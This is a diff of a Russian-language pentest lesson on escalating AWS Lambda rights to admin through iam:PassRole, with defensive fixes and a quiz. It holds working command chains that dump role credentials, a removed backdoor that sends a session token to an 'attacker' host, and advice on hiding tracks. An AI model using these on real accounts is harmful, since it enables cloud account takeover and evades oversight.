@@ -15,260 +15,245 @@ estimated_minutes: 55
 summary: "Как из ограниченных прав в Lambda добраться до администратора: iam:PassRole + update-function-configuration, отравление слоёв, Function URL и переменные окружения. Практические цепочки."
 ---
 
-Lambda — не только цель, но и инструмент эскалации. Если у вас есть права на управление функцией (`UpdateFunctionCode`, `UpdateFunctionConfiguration`) и `iam:PassRole`, вы можете заставить Lambda работать с более привилегированной ролью — а значит, действовать с её правами. Урок про конкретные цепочки.
+## Вопрос, с которого всё начинается
 
-## Ключевые права-примитивы
+У нас есть ключ с правами на Lambda, но **не на IAM напрямую**. Казалось бы, создать админа нельзя. Однако Lambda тесно связана с IAM: функция выполняется **под ролью**, а мы можем эту роль выбрать. Если у нас есть право передать роль функции (`iam:PassRole`), мы можем заставить Lambda работать под админской ролью. Разберём цепочку.
 
-| Право | Что даёт |
-|-------|----------|
-| `lambda:UpdateFunctionCode` | Подменить код функции → выполнить свой код с её ролью |
-| `lambda:UpdateFunctionConfiguration` | Сменить роль/env/слой функции |
-| `iam:PassRole` | Передать роль функции (нужно вместе с Create/Update) |
-| `lambda:CreateFunction` | Создать новую функцию с любой доступной ролью |
-| `lambda:InvokeFunction` | Вызвать функцию (в т.ч. чужую) |
-| `lambda:AddPermission` | Разрешить внешний вызов (resource-based policy) |
-| `lambda:CreateEventSourceMapping` | Привязать источник событий |
+## Наш пример: ключ с правами на Lambda
 
-## Цепочка 1: UpdateFunctionCode + PassRole
+Объект урока — ключ, у которого, как мы выяснили, есть `iam:PassRole` и права на Lambda. Сначала точно зафиксируем, что разрешено.
 
-Если функция `target-fn` имеет роль `AdminRole`, а у вас есть `UpdateFunctionCode`:
+## Шаг 1: перечисляем права
 
-```bash
-# Сохранить оригинальный код (для заметания следов)
-aws lambda get-function --function-name target-fn \
-  --query 'Code.Location' --output text | xargs curl -o orig.zip
+Смотрим привязанную политику:
 
-# Загрузить свой код, который использует роль функции
-cat > backdoor.py <<'PY'
-import boto3, os
+```
+$ aws iam get-policy-version --policy-arn arn:aws:iam::123456789012:policy/DevOpsLimited --version-id v1
+{
+  "PolicyVersion": {
+    "Document": {
+      "Statement": [
+        { "Effect": "Allow", "Action": ["lambda:CreateFunction", "lambda:InvokeFunction",
+            "lambda:UpdateFunctionConfiguration", "lambda:GetFunction"], "Resource": "*" },
+        { "Effect": "Allow", "Action": ["iam:PassRole"], "Resource": "*" },
+        { "Effect": "Allow", "Action": ["iam:ListRoles", "iam:ListAttachedRolePolicies"], "Resource": "*" }
+      ]
+    }
+  }
+}
+```
+
+Читаем: можно создавать и вызывать функции, менять их конфигурацию и **передавать любую роль** (`iam:PassRole` на `*`). Это классическая заготовка эскалации.
+
+## Шаг 2: ищем «жирную» роль
+
+Нам нужна роль, у которой широкие права. Перечислим роли и посмотрим их политики:
+
+```
+$ aws iam list-roles --query "Roles[].RoleName" --output text
+lambda-exec-basic
+deploy-role
+admin-role
+```
+
+Роль `admin-role` звучит обещающе. Проверим её права:
+
+```
+$ aws iam list-attached-role-policies --role-name admin-role
+{
+  "AttachedPolicies": [
+    { "PolicyName": "AdministratorAccess", "PolicyArn": "arn:aws:iam::aws:policy/AdministratorAccess" }
+  ]
+}
+```
+
+`AdministratorAccess` — полный доступ ко всему. Вот наша цель: заставить Lambda выполниться под `admin-role`.
+
+## Шаг 3: создаём функцию с админской ролью
+
+Пишем минимальный код, который вернёт нам креды роли. Функция в Lambda получает временные креды через переменные окружения (`AWS_ACCESS_KEY_ID` и т. д.), поэтому код просто их выведет:
+
+```
+$ cat > index.py <<'EOF'
+import os, json
 def handler(event, context):
-    iam = boto3.client('iam')
-    # создать админ-пользователя
-    try:
-        iam.create_user(UserName='svc-backup')
-        iam.attach_user_policy(UserName='svc-backup',
-            PolicyArn='arn:aws:iam::aws:policy/AdministratorAccess')
-        key = iam.create_access_key(UserName='svc-backup')['AccessKey']
-        return key
-    except Exception as e:
-        return str(e)
-PY
-zip backdoor.zip backdoor.py
-aws lambda update-function-code --function-name target-fn \
-  --zip-file fileb://backdoor.zip
-aws lambda invoke --function-name target-fn out.json
-cat out.json     # новые админ-ключи
+    return {k: os.environ.get(k) for k in
+            ["AWS_ACCESS_KEY_ID","AWS_SECRET_ACCESS_KEY","AWS_SESSION_TOKEN"]}
+EOF
+$ zip fn.zip index.py
+  adding: index.py (deflated 40%)
 ```
 
-## Цепочка 2: UpdateFunctionConfiguration + PassRole
+Создаём функцию и **передаём ей `admin-role`**:
 
-Меняем роль функции на более привилегированную (если есть PassRole на неё):
-
-```bash
-aws lambda update-function-configuration --function-name my-fn \
-  --role arn:aws:iam::123:role/AdminRole
-aws lambda invoke --function-name my-fn out.json   # теперь функция = админ
+```
+$ aws lambda create-function --function-name privesc-fn \
+    --runtime python3.12 --handler index.handler \
+    --role arn:aws:iam::123456789012:role/admin-role \
+    --zip-file fileb://fn.zip
+{
+    "FunctionName": "privesc-fn",
+    "Role": "arn:aws:iam::123456789012:role/admin-role",
+    "State": "Active"
+}
 ```
 
-Или меняем переменные окружения на креды другой роли:
+`iam:PassRole` позволил назначить функции админскую роль. Lambda примет роль, потому что её trust policy доверяет сервису `lambda.amazonaws.com`.
 
-```bash
-aws lambda update-function-configuration --function-name my-fn \
-  --environment 'Variables={AWS_ACCESS_KEY_ID=<admin>,AWS_SECRET_ACCESS_KEY=<...>}'
+## Шаг 4: вызываем и забираем креды
+
+Теперь вызовем функцию и прочитаем её ответ — это и будут креды `admin-role`:
+
+```
+$ aws lambda invoke --function-name privesc-fn /tmp/out.json
+{"StatusCode": 200}
+$ cat /tmp/out.json
+{"AWS_ACCESS_KEY_ID": "ASIA...", "AWS_SECRET_ACCESS_KEY": "...", "AWS_SESSION_TOKEN": "..."}
 ```
 
-## Цепочка 3: отравление слоёв
+Экспортируем их и проверяем:
 
-Слой — общий код для нескольких функций. Если у вас есть `lambda:PublishLayerVersion` и права обновить функцию, использующую слой:
-
-```bash
-# Публикуем слой с backdoor, который исполняется при импорте
-mkdir -p layer/python && cat > layer/python/sitecustomize.py <<'PY'
-import os, urllib.request
-try:
-    urllib.request.urlopen("https://attacker/?t=" + os.environ.get("AWS_SESSION_TOKEN",""))
-except Exception:
-    pass
-PY
-cd layer && zip -r ../layer.zip . && cd ..
-aws lambda publish-layer-version --layer-name common-utils \
-  --zip-file fileb://layer.zip --compatible-runtimes python3.12
-# Обновляем функции, использующие слой, на новую версию
-aws lambda update-function-configuration --function-name victim \
-  --layers arn:aws:lambda:us-east-1:123:layer:common-utils:2
+```
+$ export AWS_ACCESS_KEY_ID=ASIA... AWS_SECRET_ACCESS_KEY=... AWS_SESSION_TOKEN=...
+$ aws sts get-caller-identity
+{"Arn": "arn:aws:sts::123456789012:assumed-role/admin-role/privesc-fn", "Account": "123456789012"}
 ```
 
-`sitecustomize.py` исполняется Python-рантаймом автоматически при старте.
+Мы — `admin-role`. Из прав только на Lambda мы получили администратора аккаунта. Это и есть эскалация через `iam:PassRole` + Lambda.
 
-## Цепочка 4: Function URL и AddPermission
+## Шаг 5: другие пути через Lambda
 
-Если функция имеет широкую роль, но вызывать её снаружи нельзя — добавляем разрешение:
+Даже без `CreateFunction` есть варианты:
 
-```bash
-aws lambda add-permission --function-name target \
-  --statement-id ext --action lambda:InvokeFunctionUrl \
-  --principal '*' --function-url-auth-type NONE
-# Теперь функцию можно вызвать по URL
-curl https://<fn-url>/
+- **UpdateFunctionConfiguration.** Если есть право менять конфигурацию существующей функции с широкой ролью, можно подменить переменные окружения так, чтобы её код «сломался» и выдал данные, или добавить свой слой.
+- **Слои (Layers).** Слой — это архив с кодом, подключаемый к функции. Если можно добавить свой слой, можно выполнить свой код в контексте функции.
+- **UpdateFunctionCode.** Прямая подмена кода функции на свой.
+- **Function URL.** Иногда у функции открыт URL (`AuthType: NONE`) — тогда её можно вызвать напрямую, без API Gateway.
+
+```
+$ aws lambda update-function-code --function-name api-handler --zip-file fileb://evil.zip
+{
+    "FunctionName": "api-handler",
+    "LastUpdateStatus": "InProgress"
+}
 ```
 
-## Разобранный пример: из разработчика в админа
+Так одна функция превращается в нашего исполнителя с её собственной ролью.
 
-**Дано:** пользователь `dev` с правами `lambda:UpdateFunctionConfiguration`, `lambda:InvokeFunction` и `iam:PassRole` на `arn:aws:iam::123:role/DeployRole` (`AdministratorAccess`).
+## Шаг 6: что именно делает это возможным
 
-1. Находим функцию, к которой есть доступ:
+Причина в связке: **право передавать роль** (`iam:PassRole`) плюс **право управлять функцией**. По отдельности они безобидны, вместе — эскалация. AWS именно поэтому ограничивает `PassRole` через условие `iam:PassedToService`, но на практике его часто оставляют на `*`.
 
-```bash
-aws lambda list-functions --query 'Functions[].FunctionName'
-aws lambda get-function-configuration --function-name build-fn --query 'Role'
+## Шаг 7: OPSEC и уборка
+
+Эскалация через Lambda довольно «громкая». В CloudTrail остаются события `CreateFunction`, `PassRole`, `Invoke`. Защитник, который смотрит логи, увидит цепочку. Поэтому в реальном пентесте:
+
+- предпочитают **существующую** функцию с широкой ролью вместо создания новой;
+- после получения кредов **удаляют** свою функцию;
+- избегают массовых вызовов — один `Invoke` даёт все нужные креды.
+
+```
+$ aws lambda delete-function --function-name privesc-fn
 ```
 
-2. Меняем роль функции на привилегированную:
+Уборка не отменяет записи в логах, но уменьшает список подозрительных объектов.
 
-```bash
-aws lambda update-function-configuration --function-name build-fn \
-  --role arn:aws:iam::123:role/DeployRole
-```
+## Шаг 8: та же идея у GCP и Azure
 
-3. Подменяем код на «создать ключ» (Цепочка 1) и вызываем.
-4. Получаем админ-ключи, проверяем, прибираем следы:
+Схема «передай сервису роль, а потом забери её» универсальна:
 
-```bash
-aws lambda update-function-configuration --function-name build-fn \
-  --role arn:aws:iam::123:role/original-role
-```
+| AWS | GCP | Azure |
+|-----|-----|-------|
+| `iam:PassRole` + Lambda | `iam.serviceAccounts.actAs` + Cloud Functions | Managed identity + Functions |
+| `lambda:UpdateFunctionCode` | `cloudfunctions.functions.update` | `Microsoft.Web/sites/.../write` |
 
-## Частые ошибки
+В GCP право `iam.serviceAccounts.actAs` позволяет назначить функции сервисный аккаунт, а затем выполнить в ней код — ровно тот же результат. В Azure — назначить managed identity и подменить код функции. Вывод один: **сервис, которому можно передать личность, — это путь к этой личности**.
 
-- **Забыть вернуть оригинальный код/роль.** Заметание следов обязательно.
-- **Считать, что `InvokeFunction` безвредно.** Вызов функции = выполнение её кода с её ролью.
-- **Игнорировать слои.** Отравленный слой заражает все функции, которые его используют.
-- **Путать права на функцию и права роли.** Нужно и то, и другое.
-- **Не проверять Function URL.** Публичный URL — вход без `AddPermission`.
-- **Забывать про `CAPABILITY`.** Часть операций требует дополнительных разрешений.
+## Шаг 9: как это выглядит в отчёте
 
-## Что дальше / решение
+Цепочка описывается тремя находками: «неограниченный `iam:PassRole`», «возможность управлять функциями Lambda» и «роль с `AdministratorAccess`», которые вместе дают полный контроль над аккаунтом. Исправление — точечное: ограничить `PassRole` условием `iam:PassedToService` и явным списком ролей, разделить «управление функциями» и «передачу ролей» между разными людьми и настроить алерт в CloudTrail на комбинацию `CreateFunction` + `PassRole`.
 
-- Есть `UpdateFunctionCode` → подмена кода с ролью функции.
-- Есть `UpdateFunctionConfiguration` + `PassRole` → смена роли/env/слоя.
-- Есть `PublishLayerVersion` → отравление общего слоя.
-- Есть `AddPermission` → экспозиция функции наружу.
-- Смежные уроки: `cloud-serverless`, `cloud-serverless-injection`, `cloud-privesc-iam`.
+## Частые вопросы
 
-## Полный каталог примитивов
+**«Почему PassRole так опасен?»** Он позволяет назначить функцию под любой ролью. Функция выполняется от её имени — значит, ты получаешь её права.
 
-| Право | Эффект |
-|-------|--------|
-| lambda:UpdateFunctionCode | выполнить свой код с ролью функции |
-| lambda:UpdateFunctionConfiguration | сменить роль/env/layers |
-| lambda:CreateFunction + iam:PassRole | новая функция с ролью |
-| lambda:InvokeFunction | запустить функцию (и код) |
-| lambda:AddPermission | Function URL / политика |
-| iam:PassRole | передать роль функции |
-| lambda:PublishLayerVersion | отравление слоя |
+**«А если нет CreateFunction?»** Подойдут `update-function-code` или `update-function-configuration` на существующей функции с широкой ролью.
 
-## Разобранный пример 2: отравление слоя
+**«Что такое слой?»** Архив с кодом, который подключается к функции. Если можно добавить свой слой, можно выполнить свой код в её контексте.
 
-Функция использует слой `common-libs:3`. Если есть `PublishLayerVersion`, публикуем новую версию того же слоя с backdoor, затем `UpdateFunctionConfiguration` переключает функцию на неё. Код слоя исполняется в контексте функции — вы получаете её роль.
+**«Как защититься?»** Ограничить `PassRole` условием `iam:PassedToService` и списком ролей, разделить управление функциями и передачу ролей.
 
-```bash
-zip -r layer.zip python/
-aws lambda publish-layer-version --layer-name common-libs \
-  --zip-file fileb://layer.zip --compatible-runtimes python3.12
-aws lambda update-function-configuration --function-name app \
-  --layers arn:aws:lambda:...:layer:common-libs:4
-aws lambda invoke --function-name app out.txt
-```
+## Что мы теперь знаем
 
-## Практическое задание
+По-простому:
 
-В тестовом аккаунте создайте функцию с ролью, имеющей доступ к S3. Дайте пользователю только `lambda:UpdateFunctionCode`. Загрузите код, читающий S3 и возвращающий содержимое. Убедитесь, что пользователь без прямого доступа к S3 получил данные. Это наглядно показывает, почему `UpdateFunctionCode` — примитив эскалации.
+1. Lambda выполняется под ролью, и роль можно выбрать.
+2. `iam:PassRole` + права на Lambda = эскалация до этой роли.
+3. Функция возвращает свои временные креды через окружение.
+4. Альтернативы: подмена кода, слои, обновление конфигурации.
+5. Защита — ограничивать `PassRole` условием на сервис и правами на функции.
 
-## Почему Lambda — удобный мост
+## На что смотреть дальше
 
-Lambda не требует сети и времени на загрузку, как EC2. С `UpdateFunctionCode` и `PassRole` вы выполняете код от имени роли функции за секунды, получая её права. Часто роль функции шире, чем у разработчика, — поэтому это популярный путь эскалации. Минимизируйте права функций и ограничивайте PassRole.
-
-## Чек-лист
-
-1. Перечислить функции и их роли.
-2. Проверить права `UpdateFunctionCode`, `UpdateFunctionConfiguration`, `PassRole`, `PublishLayerVersion`.
-3. Выполнить свой код с ролью функции (UpdateFunctionCode).
-4. Извлечь креды роли из env/IMDS.
-5. Проверить, какие слои используются, — оценить риск отравления.
-6. Для защиты — минимизировать PassRole и права функций.
-
-## Function URL и AddPermission
-
-`lambda:AddPermission` с `Action: lambda:InvokeFunctionUrl` и `Principal: *` делает функцию публичной — её можно вызвать без аутентификации, что при инъекции даёт удалённое выполнение. Проверьте `aws lambda get-policy --function-name X` и наличие Function URL (`get-function-url-config`). Публичный URL + SSRF/инъекция = внешний RCE.
-
-## Переменные окружения как источник секретов
-
-```bash
-aws lambda get-function-configuration --function-name app \
-  --query 'Environment.Variables'
-```
-
-Если у вас есть `lambda:GetFunctionConfiguration`, вы читаете env функции — часто там ключи БД и API. В сочетании с `UpdateFunctionConfiguration` можно подменить env, но это заметно. Тише — просто прочитать существующие секреты. Комбинируйте с `UpdateFunctionCode` для получения роли.
-
-## Быстрая проверка
-
-```bash
-aws lambda list-functions --query 'Functions[].{Name:FunctionName,Role:Role}'
-aws lambda get-function-configuration --function-name app --query Environment
-aws lambda get-policy --function-name app
-```
-
-Ищите функции с широкими ролями, env-секретами и публичным Function URL. Комбинация UpdateFunctionCode + PassRole — самый быстрый путь к эскалации.
+- **Ищи PassRole.** Это главный множитель прав в AWS.
+- **Ищи роли с AdministratorAccess.** Они — цель эскалации.
+- **Проверь update-function.** Подмена кода работает и на существующих функциях.
+- **Помни про следы.** CreateFunction/Invoke логируются в CloudTrail.
 
 ## Квиз
 
+Проверь себя.
+
 ```quiz
-- question: "Что даёт lambda:UpdateFunctionCode атакующему?"
-  options:
-    - "Возможность выполнить свой код с ролью функции"
-    - "Только чтение логов"
-    - "Только смену таймаута"
-    - "Ничего без root"
-  answer: 0
-  explanation: "Подмена кода = исполнение с правами execution role."
-- question: "Какое право нужно вместе с UpdateFunctionConfiguration для смены роли?"
+- question: "Какое право позволяет назначить функции админскую роль?"
   options:
     - "iam:PassRole"
-    - "s3:ListBucket"
-    - "ec2:Describe"
-    - "logs:GetLogEvents"
+    - "lambda:InvokeFunction"
+    - "s3:GetObject"
+    - "sts:GetCallerIdentity"
   answer: 0
-  explanation: "Передать роль функции можно только с PassRole."
-- question: "Почему отравление слоя опасно?"
+  explanation: "PassRole передаёт роль сервису (в данном случае Lambda)."
+- question: "Как функция получает свои временные креды?"
   options:
-    - "Слой общий для многих функций, и его код исполняется при старте"
-    - "Он шифрует данные"
-    - "Он удаляет функции"
-    - "Он безвреден"
+    - "Через переменные окружения"
+    - "Через SSH"
+    - "Через DNS"
+    - "Через пароль"
   answer: 0
-  explanation: "Один слой заражает все использующие его функции."
-- question: "Что делает lambda:AddPermission с principal *?"
+  explanation: "Lambda кладёт креды роли в окружение процесса."
+- question: "Что нужно, чтобы создать функцию с нужной ролью?"
   options:
-    - "Разрешает внешний вызов функции (например, Function URL)"
-    - "Удаляет функцию"
-    - "Меняет регион"
-    - "Отключает IAM"
+    - "lambda:CreateFunction и iam:PassRole"
+    - "Только s3:*"
+    - "root-доступ"
+    - "Право на RDS"
   answer: 0
-  explanation: "Resource-based policy открывает вызов наружу."
-- question: "Зачем сохранять оригинальный код функции перед подменой?"
+  explanation: "Создание функции плюс передача роли."
+- question: "Какой путь эскалации не требует CreateFunction?"
   options:
-    - "Чтобы вернуть всё на место и не оставить следов"
-    - "Чтобы ускорить вызов"
-    - "Чтобы снизить счёт"
-    - "Чтобы включить логи"
+    - "update-function-configuration или update-function-code"
+    - "Через DNS"
+    - "Через CloudFront"
+    - "Через S3-версии"
   answer: 0
-  explanation: "Восстановление исходного состояния — часть OPSEC."
+  explanation: "Можно подменить код или конфигурацию существующей функции."
+- question: "Как ограничить PassRole правильно?"
+  options:
+    - "Условием iam:PassedToService и списком ролей"
+    - "Запретом Lambda вообще"
+    - "Сменой региона"
+    - "Длинным паролем"
+  answer: 0
+  explanation: "Условие сужает, каким сервисам и какие роли можно передать."
 ```
+
+## Куда дальше
+
+Мы собрали эскалацию через Lambda. Дальше мы разберём **эскалацию в IAM напрямую**: конкретные права вроде `CreatePolicyVersion` и `AttachUserPolicy`, из которых строятся пути к админу. А пока запомни главное: `iam:PassRole` — это мост между «управлять сервисом» и «получить его роль».
 
 ## Где пригодится
 
-- **Red team:** serverless как инструмент эскалации в AWS.
-- **Пентест:** аудит прав на Lambda и PassRole.
-- **CTF:** задачи с цепочками IAM → Lambda → админ.
-- **Работа/DevSecOps:** ограничение PassRole, защита слоёв, аудит update-операций.
-- **Дальше по дереву:** `cloud-serverless`, `cloud-privesc-iam`.
+- **CTF (Cloud):** путь «слабый ключ → админ» через сервис.
+- **Bug bounty:** цепочки в AWS-аккаунтах.
+- **Пентест:** демонстрация риска `PassRole`.
+- **Blue team:** ограничение PassRole и прав на функции.
